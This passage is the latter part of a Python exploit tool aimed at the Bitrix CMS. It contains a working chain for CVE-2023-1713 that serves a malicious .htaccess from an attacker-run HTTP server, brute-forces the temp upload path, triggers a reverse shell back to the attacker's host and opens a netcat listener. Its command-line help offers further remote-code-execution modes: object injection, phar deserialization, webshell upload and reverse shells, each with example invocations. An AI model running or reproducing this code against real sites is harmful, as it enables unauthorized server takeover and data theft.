                print_fail('Response body is empty\n\n')
        else:
            print_fail(
                f'Page bitrix/tools/html_editor_action.php is not available. Status code: {r.status_code}')


class RCETempFileCreate:

    def __init__(self, session, target, path_login, login, password, lport1, lport2, lhost, delay_seconds, n_reps,
                 site_id):
        self.__session = session
        self.__target = target
        self.__sessid = None
        self.__login = login
        self.__password = password
        self.__path_login = path_login
        self.__lport1 = lport1
        self.__lport2 = lport2
        self.__lhost = lhost
        self.__delay_seconds = delay_seconds
        self.__n_reps = n_reps
        self.__site_id = site_id

    def nested_to_urlencoded(self, val: typing.Any, prefix="") -> dict:
        out = dict()
        if type(val) is dict:
            for k, v in val.items():
                child = self.nested_to_urlencoded(v, prefix=f"[{k}]")
                for key, val in child.items():
                    out[prefix + key] = val
        elif type(val) in [list, tuple]:
            for i, item in enumerate(val):
                child = self.nested_to_urlencoded(item, prefix=f"[{i}]")
                for key, val in child.items():
                    out[prefix + key] = val
        else:
            out[prefix] = val
        return out

    def check_creds(self, cookie, sessid):
        return self.__session.get(f"{self.__target}bitrix/tools/public_session.php", headers={
            "X-Bitrix-Csrf-Token": sessid
        }, cookies={
            "PHPSESSID": cookie,
        }, verify=False).text == "OK"

    def login(self):
        self.__session.cookies.pop('PHPSESSID', None)
        if os.path.isfile("./cached-creds.txt"):
            cookie, sessid = open("./cached-creds.txt").read().split(":")
            if self.check_creds(cookie, sessid):
                self.__session.cookies.set("PHPSESSID", cookie)
                self.__sessid = sessid
                print_ok("Using cached credentials")
                return
            else:
                print_fail("Cached credentials are invalid")
        resp = self.__session.post(
            f"{self.__target}{self.__path_login}",
            data={
                "AUTH_FORM": "Y",
                "TYPE": "AUTH",
                "backurl": "/",
                "USER_LOGIN": self.__login,
                "USER_PASSWORD": self.__password,
            },
            verify=False,
        )
        if self.__session.cookies.get("BITRIX_SM_LOGIN", "") == "":
            print_fail(f"Invalid credentials")
            exit()

        print_ok(f"Logged in as {self.__login}")
        self.__sessid = get_composite_data(self.__session, self.__target)['bitrix_sessid']
        with open("./cached-creds.txt", "w") as f:
            f.write(f"{self.__session.cookies.get('PHPSESSID')}:{self.__sessid}")

    def start_server(self, delay_seconds):
        class MyHandler(http.server.BaseHTTPRequestHandler):
            htaccess = open("./.htaccess", "rb").read()

            def do_GET(self):
                path = urlparse(self.path).path

                self.send_response(200)
                self.end_headers()

                # Request .htaccess
                if ".htaccess" in path:
                    self.wfile.write(self.htaccess)
                    self.wfile.flush()
                    return

                # Delay
                print_ok(f"Delaying return by {delay_seconds} seconds")
                # send the body of the response
                for i in range(delay_seconds):
                    self.wfile.write(b"A\n")
                    self.wfile.flush()
                    time.sleep(1)

                # Shutdown server when done
                self.server.shutdown()

            def log_message(self, format: str, *args: typing.Any) -> None:
                # Silence logging
                pass

        class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
            """Handle requests in a separate thread."""

        httpd = ThreadedHTTPServer(("0.0.0.0", self.__lport1), MyHandler)

        def forever():
            with httpd:
                httpd.serve_forever()

        thread = threading.Thread(target=forever, daemon=True)
        thread.start()
        print_ok(f"Started HTTP server on {self.__lport1}")
        return httpd

    def instagram_import(self):
        resp = self.__session.post(
            f"{self.__target}/bitrix/services/main/ajax.php?mode=class&c=bitrix%3acrm.order.import.instagram.view&action=importAjax",
            data=self.nested_to_urlencoded([{
                "IMAGES": [
                              f"http://{self.__lhost}:{self.__lport1}/.htaccess"
                          ] * self.__n_reps + [f"http://{self.__lhost}:{self.__lport1}/delay"],
                "NAME": "Product 1"
            }], prefix="items"
            ),
            headers={"X-Bitrix-Csrf-Token": self.__sessid},
            verify=False,
        )

        # if "server" in resp.headers:
        #     for serv in ["nginx", "iis"]:
        #         if serv in resp.headers['server'].lower():
        #             print(f"{bcolors.FAIL}Not vulnerable{bcolors.ENDC}")
        #             print('\n')
        #             return
        try:
            resp_json = resp.json()
            if "Could not build component instance" in resp_json["errors"][0]["message"]:
                print_fail("Error. Not vulnerable")
                return False
        except json.JSONDecodeError as e:
            print_fail(f"Invalid JSON syntax: {e}")
            print_fail("Error. Not vulnerable")
            return False

        print_ok("Waiting done")
        return True

    def test_exists(self, dir_name):
        dir_name = "".join(dir_name)
        resp = self.__session.head(f"{self.__target}/upload/tmp/{dir_name}/.htaccess", verify=False)
        return resp.status_code == 200, dir_name

    def bruteforce(self):
        print_ok(f"Bruteforcing .htaccess location")
        chars = string.digits + string.ascii_lowercase
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_results = executor.map(self.test_exists, itertools.product(chars, repeat=3))
            for ok, dir_name in tqdm(future_results, total=(len(chars) ** 3), desc='Searching .htaccess', ncols=100):
                if ok:
                    print_ok(f"Found .htaccess: {self.__target}/upload/tmp/{dir_name}/.htaccess")
                    return dir_name
        return None

    def reverse_shell(self, dir_name):
        self.__session.get(f"{self.__target}/upload/tmp/{dir_name}/.htaccess?ip={self.__lhost}&port={self.__lport2}",
                           verify=False)

    def run(self):
        self.login()
        self.start_server(self.__delay_seconds)
        ok = self.instagram_import()
        if ok:
            dir_name = self.bruteforce()
            if dir_name:
                threading.Thread(target=self.reverse_shell, args=(dir_name,)).start()
                print_ok("Waiting for reverse shell connection")
                subprocess.run(["nc", "-nvlp", str(self.__lport2)])
            else:
                print_fail('Not vulnerable')


def main():
    parser = argparse.ArgumentParser(
        prog='python3 test_bitrix.py',
        description=ascii_banner,
        epilog="""
    Example of usage:

    Scan:
        python3 test_bitrix.py -t https://example.com scan -s http://subdomain.oastify.com

    RCE "html_editor_action":
        python3 test_bitrix.py -t https://example.com object_injection -c 'ls | base64'

    RCE vote phar deserialization (payload must be .phar):
        php -d phar.readonly=0 gadgets.php rce1 system '<os command here>' payload.phar
        python3 test_bitrix.py -t https://example.com vote_phar -p payload.phar

    RCE vote:
        webshell: python3 test_bitrix.py -t https://example.com rce_vote --web-shell true
        OR
        reverse shell: python3 test_bitrix.py -t https://example.com rce_vote --lhost 52.52.88.11 --lport 8001

    RCE vote using .htaccess (payload must not be .php):
        python3 test_bitrix.py -t https://example.com vote_htaccess -p shell.html
        
    RCE via Insecure Temporary File Creation (the path of the login url can be taken from the scanner):
        python3 test_bitrix.py -t https://example.com tmp_file_create -r bitrix/components/bitrix/map.yandex.search/settings/settings.php?login=yes -l user -p 123456 --lhost 192.168.1.11 --lport1 8001 --lport2 9001
        OR
        create file cached-creds.txt in the same directory as the Python3 exploit code, and write down PHPSESSID:sessid value, then run the command below
        python3 test_bitrix.py -t https://example.com tmp_file_create --lhost 192.168.1.11 --lport1 8001 --lport2 9001
    """,
        formatter_class=Formatter
    )

    # Common ------------------------------------------------------------------------------
    parser.add_argument("-t", '--target', help='target url (example: https://target.com)', required=True)
    parser.add_argument("-x", '--proxy', metavar="proxy", help='URL proxy (example: http://127.0.0.1:8080)')
    subparser = parser.add_subparsers(dest='subcommand')
    subparser.required = True

    # Scan mode ---------------------------------------------------------------------------
    parser_scan = subparser.add_parser('scan', help='Scan mode')
    parser_scan.add_argument("-s", '--ssrf_url',
                             help='url for ssrf attack (example: http://5kqki2fsl626q2257vy6xc2ef5lw9rxg.oastify.com)',
                             required=True)

    # RCE vote mode -----------------------------------------------------------------------
    parser_rce_vote = subparser.add_parser('rce_vote', help='RCE vote mode')
    parser_rce_vote.add_argument('--id_agent', default=4, type=int,
                                 help='ID of vote module agent (2, 4 and 7 available)')
    parser_rce_vote.add_argument('--lhost', help='IP address for reverse connection')
    parser_rce_vote.add_argument('--lport', help='Port of the host that listens for reverse connection')
    parser_rce_vote.add_argument('--web-shell', metavar='webshell', default=False, type=bool,
                                 help='Use web shell instead of console reverse shell')
    parser_rce_vote.add_argument('--path', metavar='path', default='',
                                 help='Path where in the site to upload a random file (example: /upload/iblock/1d3/)')

    # RCE vote phar deserialization mode --------------------------------------------------
    parser_vote_phar = subparser.add_parser('vote_phar', help='RCE vote phar deserialize mode (Exploit Nginx or '
                                                              'Apache setup using PHAR deserialization)')
    parser_vote_phar.add_argument('-p', '--payload', metavar='payload', type=argparse.FileType("rb"),
                                  help='Path to payload file', required=True)

    # RCE vote using .htaccess mode -------------------------------------------------------
    parser_vote_htaccess = subparser.add_parser('vote_htaccess',
                                                help='RCE vote using .htaccess mode (Exploit Apache setup using .htaccess and shell upload)')
    parser_vote_htaccess.add_argument('-p', '--payload', metavar='payload', type=argparse.FileType("rb"),
                                      help='Path to payload file', required=True)

    # RCE object injection mode -----------------------------------------------------------
    parser_rce_object_injection = subparser.add_parser('object_injection', help='RCE object injection mode')
    parser_rce_object_injection.add_argument('-f', '--function', default='system', help='Used function')
    parser_rce_object_injection.add_argument('-c', '--command', help='Command for execution', required=True)

    # Remote Command Execution (RCE) via Insecure Temporary File Creation (CVE-2023-1713)
    # https://starlabs.sg/advisories/23/23-1713/
    parser_tmp_file_create = subparser.add_parser('tmp_file_create', help="""
    RCE via Insecure Temporary File Creation CVE-2023-1713 (It works only with Apache. 
    The .htaccess file is required to be present in the same directory as the python script code).
    Need any valid set of credentials (regardless of privileges)
    """)
    parser_tmp_file_create.add_argument('-r', '--path_login', default='', help='Url path for login')
    parser_tmp_file_create.add_argument('-l', '--login', default='', help='User login')
    parser_tmp_file_create.add_argument('-p', '--password', default='', help='User password')
    parser_tmp_file_create.add_argument('--lhost', help='IP address for reverse connection', required=True)
    parser_tmp_file_create.add_argument('--lport1', help='Port of the host that listens for web connection',
                                        required=True, type=int)
    parser_tmp_file_create.add_argument('--lport2', help='Port of the host that listens for reverse shell connection',
                                        required=True, type=int)
    parser_tmp_file_create.add_argument('-d', '--delay_seconds', help='Delay the deletion of uploaded files',
                                        default=60, type=int)
    parser_tmp_file_create.add_argument('-n', '--n_reps', help='Number of replicated files', default=1000, type=int)
    parser_tmp_file_create.add_argument('-i', '--site_id', help='Site id', default='s1')
    args = parser.parse_args()

    if args.subcommand == "vote_htaccess" or args.subcommand == "vote_phar":
        ext = pathlib.Path(args.payload.name).suffix

    if (args.subcommand == "vote_htaccess" and ext == ".php") or (args.subcommand == "vote_phar" and ext != ".phar"):
        print_fail("Invalid payload extension")
        sys.exit(1)

    target_url = args.target
    if target_url[-1] != '/':
        target_url += '/'

    ssrf_url = ''
    if args.subcommand == 'scan':
        ssrf_url = args.ssrf_url
        if ssrf_url[-1] != '/':
            ssrf_url += '/'

    session = requests.Session()
    session.headers.update(headers)

    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy,
        }
        session.proxies.update(proxies)

    print(ascii_banner)
    try:
        response = session.get(target_url, verify=False)
    except requests.exceptions.ConnectionError:
        print_fail(f'Host name does not exists. Check domain name for errors')
        sys.exit(1)
    try:
        if args.subcommand == 'scan':
            scanner = Scanner(session, target_url, ssrf_url)
            scanner.scan()
        if args.subcommand == 'rce_vote':
            rce_vote = RCEVote(session, target_url, args.id_agent, args.web_shell, args.path, args.lhost, args.lport)
            rce_vote.run()
        if args.subcommand == 'object_injection':
            object_injection = ObjectInjection(session, target_url, args.function, args.command)
            object_injection.run()
        if args.subcommand == 'vote_phar':
            rce_vote_upload = RCEVoteUpload(session, target_url, args.payload, args.payload.name)
            rce_vote_upload.run_phar()
        if args.subcommand == 'vote_htaccess':
            rce_vote_upload = RCEVoteUpload(session, target_url, args.payload, args.payload.name)
            rce_vote_upload.run_htaccess()
        if args.subcommand == 'tmp_file_create':
            rce_temp_file_create = RCETempFileCreate(session, target_url, args.path_login, args.login, args.password,
                                                     args.lport1, args.lport2, args.lhost, args.delay_seconds,
                                                     args.n_reps, args.site_id)
            rce_temp_file_create.run()
    except Exception as e:
        print_fail(f'Error: {str(e)}')
        sys.exit(1)


if __name__ == "__main__":
    main()
